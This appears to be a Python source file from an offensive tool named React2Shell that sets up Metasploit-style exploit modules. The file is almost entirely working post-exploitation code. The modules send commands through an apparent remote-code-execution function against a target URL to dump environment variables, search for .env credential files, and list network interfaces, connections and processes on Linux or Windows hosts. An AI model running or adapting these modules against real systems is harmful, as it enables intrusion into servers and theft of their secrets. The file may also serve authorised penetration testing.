"""Exploit modules system for React2Shell (Metasploit-style)."""

from typing import Dict, Any, List, Optional
from ..classes.executor import execute_command
from ..utils.colors import Colors, colorize


class ExploitModule:
    """Base class for exploit modules."""
    
    def __init__(self, name: str, description: str):
        self.name = name
        self.description = description
        self.options = {}
    
    def run(self, target_url: str, **kwargs) -> Dict[str, Any]:
        """Execute the exploit module."""
        raise NotImplementedError("Subclasses must implement run()")
    
    def set_option(self, key: str, value: Any):
        """Set a module option."""
        self.options[key] = value
    
    def get_option(self, key: str, default: Any = None) -> Any:
        """Get a module option."""
        return self.options.get(key, default)


class ModuleRegistry:
    """Registry for exploit modules."""
    
    def __init__(self):
        self.modules: Dict[str, ExploitModule] = {}
    
    def register(self, module: ExploitModule):
        """Register an exploit module."""
        self.modules[module.name] = module
    
    def list_modules(self) -> List[str]:
        """List all registered modules."""
        return list(self.modules.keys())
    
    def get_module(self, name: str) -> Optional[ExploitModule]:
        """Get a module by name."""
        return self.modules.get(name)
    
    def show_info(self, name: str):
        """Show information about a module."""
        module = self.get_module(name)
        if module:
            print(colorize(f"\n[*] Module: {module.name}", Colors.CYAN))
            print(colorize(f"[*] Description: {module.description}", Colors.CYAN))
            if module.options:
                print(colorize("[*] Options:", Colors.CYAN))
                for key, value in module.options.items():
                    print(f"    {key}: {value}")
        else:
            print(colorize(f"[-] Module '{name}' not found", Colors.RED))


# Built-in exploit modules
class EnvDumpModule(ExploitModule):
    """Dump environment variables."""
    
    def __init__(self):
        super().__init__("env_dump", "Dump all environment variables")
    
    def run(self, target_url: str, **kwargs) -> Dict[str, Any]:
        timeout = kwargs.get("timeout", 10)
        verify_ssl = kwargs.get("verify_ssl", True)
        windows = kwargs.get("windows", False)
        proxies = kwargs.get("proxies", None)
        
        cmd = "env | sort" if not windows else 'powershell -c "Get-ChildItem Env: | Format-Table -AutoSize"'
        result = execute_command(target_url, cmd, timeout, verify_ssl, windows, base64_encode=True, proxies=proxies)
        return result


class FileSearchModule(ExploitModule):
    """Search for files matching patterns."""
    
    def __init__(self):
        super().__init__("file_search", "Search for files matching patterns")
        self.set_option("pattern", "*.env")
        self.set_option("path", "/app")
    
    def run(self, target_url: str, **kwargs) -> Dict[str, Any]:
        timeout = kwargs.get("timeout", 10)
        verify_ssl = kwargs.get("verify_ssl", True)
        windows = kwargs.get("windows", False)
        proxies = kwargs.get("proxies", None)
        pattern = self.get_option("pattern", "*.env")
        path = self.get_option("path", "/app")
        
        if windows:
            cmd = f'powershell -c "Get-ChildItem -Path {path} -Filter {pattern} -Recurse | Select-Object FullName"'
        else:
            cmd = f'find {path} -name "{pattern}" 2>/dev/null | head -50'
        
        result = execute_command(target_url, cmd, timeout, verify_ssl, windows, base64_encode=True, proxies=proxies)
        return result


class NetworkScanModule(ExploitModule):
    """Scan network from target."""
    
    def __init__(self):
        super().__init__("network_scan", "Scan network interfaces and connections")
    
    def run(self, target_url: str, **kwargs) -> Dict[str, Any]:
        timeout = kwargs.get("timeout", 10)
        verify_ssl = kwargs.get("verify_ssl", True)
        windows = kwargs.get("windows", False)
        proxies = kwargs.get("proxies", None)
        
        if windows:
            cmd = 'powershell -c "Get-NetIPAddress | Format-Table; Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Format-Table"'
        else:
            cmd = "ifconfig; netstat -tuln 2>/dev/null || ss -tuln 2>/dev/null"
        
        result = execute_command(target_url, cmd, timeout, verify_ssl, windows, base64_encode=True, proxies=proxies)
        return result


class ProcessListModule(ExploitModule):
    """List running processes."""
    
    def __init__(self):
        super().__init__("process_list", "List all running processes")
    
    def run(self, target_url: str, **kwargs) -> Dict[str, Any]:
        timeout = kwargs.get("timeout", 10)
        verify_ssl = kwargs.get("verify_ssl", True)
        windows = kwargs.get("windows", False)
        proxies = kwargs.get("proxies", None)
        
        if windows:
            cmd = 'powershell -c "Get-Process | Format-Table Id,ProcessName,Path"'
        else:
            cmd = "ps aux"
        
        result = execute_command(target_url, cmd, timeout, verify_ssl, windows, base64_encode=True, proxies=proxies)
        return result


# Initialize module registry
_module_registry = ModuleRegistry()
_module_registry.register(EnvDumpModule())
_module_registry.register(FileSearchModule())
_module_registry.register(NetworkScanModule())
_module_registry.register(ProcessListModule())


def get_module_registry() -> ModuleRegistry:
    """Get the global module registry."""
    return _module_registry

